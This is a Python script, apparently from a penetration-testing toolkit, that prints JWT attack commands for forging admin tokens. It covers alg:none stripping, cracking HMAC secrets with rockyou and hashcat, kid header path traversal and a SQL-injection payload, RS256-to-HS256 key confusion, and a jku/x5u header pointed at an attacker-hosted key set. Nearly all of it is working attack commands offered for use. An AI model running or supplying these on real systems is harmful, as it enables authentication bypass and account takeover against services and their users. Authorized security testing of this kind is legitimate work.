#!/usr/bin/env python3
"""JWT ATTACKS -> auth bypass / privilege forgery. PRINTS payloads/commands. Edit in _web_common.py.

Usage:
  python3 gen_jwt.py none      --token <jwt>              # alg:none / alg confusion
  python3 gen_jwt.py crack     --token <jwt>              # weak HMAC secret -> forge any claims
  python3 gen_jwt.py kid       --token <jwt>              # kid header injection (path/SQLi)
  python3 gen_jwt.py confusion --token <jwt> --pubkey key.pem   # RS256 -> HS256 (sign with the public key)
"""
import sys
import _web_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "none"
tok = opt("--token", "<jwt>")

print("# recon: decode the JWT (jwt.io or `jwt_tool <jwt>`); note alg, kid, and the claims to forge (role/sub/admin).")
print("# supply your captured token as --token <jwt>. -> ok (any mode): the server ACCEPTS the forged token (200 / admin view) instead of 401.\n")

if arg == "none":
    print("# needs: a lib that accepts alg:none (an unsigned token). Set header alg to none, strip the signature:")
    print(f"jwt_tool {tok} -X a                       # auto 'none' variants (none/None/NONE) — try first")
    print("# manual: header {\"alg\":\"none\"} . {\"user\":\"admin\",\"role\":\"admin\"} . (empty sig)")
elif arg == "crack":
    print("# needs: the token is HS256 (symmetric) AND the secret is weak/guessable.")
    print(f"jwt_tool {tok} -C -d /usr/share/wordlists/rockyou.txt      # (try first) dictionary  -> ok: jwt_tool prints the found secret")
    print(f"hashcat -m 16500 '{tok}' /usr/share/wordlists/rockyou.txt  # JWT mode (faster/GPU)")
    print(f"# cracked? forge:  jwt_tool {tok} -S hs256 -p '<secret>' -T   (edit claims interactively)")
elif arg == "kid":
    print("# needs: the token has a `kid` header the server uses to LOCATE the signing key (path/DB lookup).")
    print("#  path traversal to a known-contents file:  kid=\"../../../../dev/null\"  -> sign with an empty key (try first):")
    print(f"   jwt_tool {tok} -I -hc kid -hv '../../../../../../dev/null' -S hs256 -p ''")
    print("#  SQLi in kid:  kid=\"x' UNION SELECT 'key'-- -\"  -> you control the returned key")
    print("#  point kid at a file you control the contents of (uploaded file / log).")
elif arg == "confusion":
    pub = opt("--pubkey", "<public.pem>")
    print("# needs: the token is RS256 (asymmetric) AND you can obtain the server's PUBLIC key.")
    print(f"# 1) get the server's public key ({pub}) — from JWKS (/.well-known/jwks.json), a cert, or derive from 2 tokens.")
    print(f"jwt_tool {tok} -X k -pk {pub}            # auto RS256->HS256, signs HMAC with the public key")
    print(f"# then edit claims (role=admin) — the server verifies HS256 with the PUBLIC key it thinks is for RS256.")
else:
    print("use: none | crack | kid | confusion"); sys.exit(1)

print(f"\n# also try: jku/x5u header -> point to a JWKS on {P.LHOST} you control (host your own key); expired/nbf tampering.")
print(f"# a forged admin token = auth bypass / account takeover. Log it as a finding (jwt / auth-bypass).")
